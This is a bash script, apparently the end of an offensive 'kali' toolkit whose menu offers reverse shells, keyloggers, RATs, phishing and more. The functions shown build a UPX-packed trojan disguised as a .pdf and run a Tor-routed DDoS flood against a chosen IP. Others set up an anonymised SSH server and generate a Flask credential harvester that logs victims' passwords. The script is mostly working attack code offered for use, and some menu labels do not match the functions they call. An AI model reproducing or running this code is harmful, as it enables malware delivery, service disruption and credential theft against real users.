    gcc -o "$compiled_payload" "$payload_file" -lws2_32 -O2 -s
    if [[ $? -ne 0 ]]; then
        echo "Error: Failed to compile payload."
        return 1
    fi

    # Combine the benign executable and the compiled payload
    echo "Creating trojan executable..."
    cat "$benign_file" "$compiled_payload" > "$trojan_file"

    # Pack the trojan executable with UPX
    if command -v upx &> /dev/null; then
        echo "Packing the trojan executable with UPX..."
        upx --best "$trojan_file"
        if [[ $? -ne 0 ]]; then
            echo "Error: UPX failed to pack the executable."
            return 1
        fi
    else
        echo "Warning: UPX not found. Skipping packing."
    fi

    # Rename the trojan executable
    timestamp=$(date +%s)              
    new_name="doc_$timestamp.pdf"      
    mv "$trojan_file" "$new_name"

    # Clean up intermediate files
    rm "$payload_file" "$compiled_payload"

    echo "==============================="
    echo "Highly obfuscated trojan executable created: $new_name"
    echo "==============================="
}

ddos_attack() {

  # Step 1: Define default values
  local TARGET_IP=""
  local TARGET_PORT=80
  local NUM_CONNECTIONS=100
  local TOR_MODE=false
  local TOR_EXIT_NODE=""

  # Step 2: Get the target IP address and port
  read -p "Enter the target IP address: " TARGET_IP
  if [ -z "$TARGET_IP" ]; then
    echo "You must specify a target IP address!"
    exit 1
  fi

  read -p "Enter the target port (default is 80): " input_port
  if [ ! -z "$input_port" ]; then
    TARGET_PORT=$input_port
  fi

  # Step 3: Get the number of concurrent connections
  read -p "Enter the number of connections (default is 100): " input_connections
  if [ ! -z "$input_connections" ]; then
    NUM_CONNECTIONS=$input_connections
  fi

  # Step 4: Check if user wants to use Tor for anonymity
  read -p "Do you want to route the attack through Tor? (y/n) [n]: " use_tor
  if [[ "$use_tor" =~ ^(y|Y) ]]; then
    TOR_MODE=true

    # Step 5: Ask for a specific Tor exit node (optional)
    read -p "Enter a specific Tor exit node (e.g., {us} or {no}) [Press Enter to skip]: " TOR_EXIT_NODE
    TOR_EXIT_NODE=${TOR_EXIT_NODE:-""}
  fi

  # Step 6: Install necessary packages (curl, torsocks, tor)
  echo "Installing necessary packages..."
  sudo apt-get update
  sudo apt-get install -y curl torsocks tor

  if [ "$TOR_MODE" = true ]; then
    # Step 7: Configure Tor if required
    echo "Configuring Tor..."
    sudo systemctl enable tor
    sudo systemctl start tor
    if [ ! -z "$TOR_EXIT_NODE" ]; then
      sudo sed -i "/^ExitNodes/c\ExitNodes $TOR_EXIT_NODE" /etc/tor/torrc
    fi
    sudo systemctl restart tor
    echo "Tor is configured and running with exit node: $TOR_EXIT_NODE"
  fi

  # Step 8: Start the attack
  echo "Launching DDoS attack on $TARGET_IP:$TARGET_PORT with $NUM_CONNECTIONS connections..."

  # Function to send HTTP requests
  send_request() {
    if [ "$TOR_MODE" = true ]; then
      torsocks curl -s "http://$TARGET_IP:$TARGET_PORT" >/dev/null
    else
      curl -s "http://$TARGET_IP:$TARGET_PORT" >/dev/null
    fi
  }

  # Step 9: Use concurrent connections to flood the target
  for ((i = 1; i <= NUM_CONNECTIONS; i++)); do
    send_request &
  done

  # Wait for all background processes to finish
  wait

  echo "DDoS attack complete on $TARGET_IP:$TARGET_PORT with $NUM_CONNECTIONS connections."
}



start_ssh_server() {

  # Step 1: Define default values
  local SSH_PORT=2222
  local NEW_USER=""

  # Step 2: Check if user wants to specify a custom SSH port
  read -p "Enter a custom SSH port (default is 2222) [Press Enter to use default]: " input_ssh_port
  if [ ! -z "$input_ssh_port" ]; then
    SSH_PORT=$input_ssh_port
  fi

  # Step 3: Get the username for the new non-root user
  read -p "Enter the username for the new non-root user: " NEW_USER
  if [ -z "$NEW_USER" ]; then
    echo "You must specify a username!"
    exit 1
  fi

  # Step 4: Check if user wants a specific Tor exit node
  read -p "Do you want to set a specific Tor exit node? (e.g. {us} or {no}) Leave blank for default [Press Enter]: " TOR_EXIT_NODE
  TOR_EXIT_NODE=${TOR_EXIT_NODE:-""}

  # Step 5: Update system packages
  echo "Updating system packages..."
  sudo apt-get update && sudo apt-get upgrade -y

  # Step 6: Install necessary packages (SSH, Tor, sudo, curl, gnupg)
  echo "Installing SSH, Tor, and other required packages..."
  sudo apt-get install -y openssh-server tor sudo curl gnupg

  # Step 7: Enable and start the SSH service
  echo "Enabling and starting SSH service..."
  sudo systemctl enable ssh
  sudo systemctl start ssh

  # Step 8: Harden SSH configuration with user-defined port
  echo "Configuring SSH for better security..."
  sudo sed -i "s/#Port 22/Port $SSH_PORT/" /etc/ssh/sshd_config
  sudo sed -i 's/PermitRootLogin yes/PermitRootLogin no/' /etc/ssh/sshd_config
  sudo sed -i 's/#PasswordAuthentication yes/PasswordAuthentication no/' /etc/ssh/sshd_config
  sudo systemctl restart ssh

  echo "SSH configured. Ensure you have set up key-based authentication on port $SSH_PORT."

  # Step 9: Configure Tor for anonymous traffic routing
  echo "Configuring Tor for anonymous traffic routing..."
  sudo cp /etc/tor/torrc /etc/tor/torrc.bak
  echo -e "# SOCKS proxy for anonymous SSH access\nSocksPort 9050\nControlPort 9051" | sudo tee -a /etc/tor/torrc
  if [ ! -z "$TOR_EXIT_NODE" ]; then
    echo "ExitNodes $TOR_EXIT_NODE" | sudo tee -a /etc/tor/torrc
  fi

  # Step 10: Start Tor service
  echo "Starting Tor service..."
  sudo systemctl enable tor
  sudo systemctl start tor

  # Step 11: Install Anonsurf for full system-wide Tor routing (optional)
  echo "Installing Anonsurf to route all traffic through Tor..."
  git clone https://github.com/Und3rf10w/kali-anonsurf
  cd kali-anonsurf || exit
  sudo ./installer.sh

  # Step 12: Start Anonsurf to route all traffic through Tor
  echo "Starting Anonsurf to route all system traffic through Tor..."
  sudo anonsurf start

  # Step 13: Set up SSH over Tor (optional)
  echo "Setting up SSH through Tor using torsocks..."
  sudo apt-get install -y torsocks

  echo "To connect via SSH over Tor, use the following command on your client machine:"
  echo "torsocks ssh -p $SSH_PORT $NEW_USER@your_server_ip"

  # Step 14: Create a non-root user for SSH access
  echo "Creating a non-root user for SSH access..."
  sudo adduser "$NEW_USER"
  sudo usermod -aG sudo "$NEW_USER"

  echo "Non-root user created. Ensure you can SSH into this account using your SSH key."

  # Step 15: Configure firewall (optional, for enhanced security)
  echo "Setting up UFW firewall to only allow SSH and Tor..."
  sudo apt-get install -y ufw
  sudo ufw default deny incoming
  sudo ufw default allow outgoing
  sudo ufw allow "$SSH_PORT"/tcp # Allow custom SSH port
  sudo ufw allow 9050/tcp # Allow Tor SOCKS proxy
  sudo ufw enable

  echo "Firewall configured. Only SSH on port $SSH_PORT and Tor are allowed."
  echo "Your anonymous Debian server setup is complete!"
}


# Function to create a credential harvester with data encryption
create_credential_harvester() {
    echo "Creating credential harvester with data encryption..."
    read -p "Enter the URL to submit credentials: " submit_url
    cat <<EOF > harvester.py
from flask import Flask, request
import base64

app = Flask(__name__)

@app.route('/submit', methods=['POST'])
def submit():
    username = request.form['username']
    password = request.form['password']
    encoded_credentials = base64.b64encode(f'Username: {username}, Password: {password}'.encode()).decode()
    with open('credentials.txt', 'a') as f:
        f.write(f'{encoded_credentials}\\n')
    return 'Credentials submitted!'

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
EOF
    echo "Credential harvester created: harvester.py"
}

# Main menu
while true; do
    echo "Choose an option:"
    echo "1) Generate manually obfuscated DLL"
    echo "2) Generate DLL with msfvenom"
    echo "3) Create encrypted EXE loader"
    echo "4) Create Ncat reverse shell"
    echo "5) Create PowerShell reverse shell"
    echo "6) Create Batch reverse shell"
    echo "7) Create Python reverse shell"
    echo "8) Generate keylogger"
    echo "9) Generate trojan executable"
    echo "10) Create phishing page"
    echo "11) Generate Windows service payload"
    echo "12) Create payload for USB exploitation"
    echo "13) Generate reverse HTTPS payload"
    echo "14) Create payload with persistence"
    echo "15) Generate fake update payload"
    echo "16) Create process injection payload"
    echo "17) Generate network scanning payload"
    echo "18) Create RAT"
    echo "19) Generate Wi-Fi password sniffer"
    echo "20) Generate simple SQL injection script"
    echo "21) Create credential harvester"
    echo "22) Start anonsurf"
    echo "23) Start metasploit_framework"
    echo "24) Start airgeddon "
    echo "25) Start wireshark "
    echo "26) Start I2P DDOS attack"
    echo "27) DEAMON MANAGER by V.ex.e"
    echo "28) Start listening for zombies"
    echo "29) Generate Trojan.exe that connects to DEAMON MANAGER by V.ex.e"
    echo "0) Exit"
    read -p "Enter your choice: " choice

    case $choice in
        1) display_kali_dragon; generate_obfuscated_dll ;;
        2) display_kali_dragon; generate_dll_with_msfvenom ;;
        3) display_kali_dragon; create_encrypted_loader ;;
        4) display_kali_dragon; create_ncat_reverse_shell ;;
        5) display_kali_dragon; create_powershell_reverse_shell ;;
        6) display_kali_dragon; create_batch_reverse_shell ;;
        7) display_kali_dragon; create_python_reverse_shell ;;
        8) display_kali_dragon; generate_keylogger ;;
        9) display_kali_dragon; generate_trojan_executable ;;
        10) display_kali_dragon; create_phishing_page ;;
        11) display_kali_dragon; generate_windows_service_payload ;;
        12) display_kali_dragon; create_usb_exploitation_payload ;;
        13) display_kali_dragon; generate_reverse_https_payload ;;
        14) display_kali_dragon; create_persistence_payload ;;
        15) display_kali_dragon; generate_fake_update_payload ;;
        16) display_kali_dragon; create_process_injection_payload ;;
        17) display_kali_dragon; generate_network_scanning_payload ;;
        18) display_kali_dragon; create_rat ;;
        19) display_kali_dragon; generate_wifi_password_sniffer ;;
        20) display_kali_dragon; generate_sql_injection_script ;;
        21) display_kali_dragon; create_credential_harvester ;;
        22) display_kali_dragon; start_anonsurf ;;
        23) display_kali_dragon; start_metasploit_framework ;;
        24) display_kali_dragon; start_airgeddon ;;
        25) display_kali_dragon; start_wireshark ;;
        26) display_kali_dragon; ddos_attack ;;
        27) display_kali_dragon; start_listener ;;
        28) display_kali_dragon; start_ssh_server ;;
        29) display_kali_dragon; generate_trojan_executable_ssh ;;
        0) display_kali_dragon; exit ;;
        *) echo "Invalid option!" ;;
    esac
done
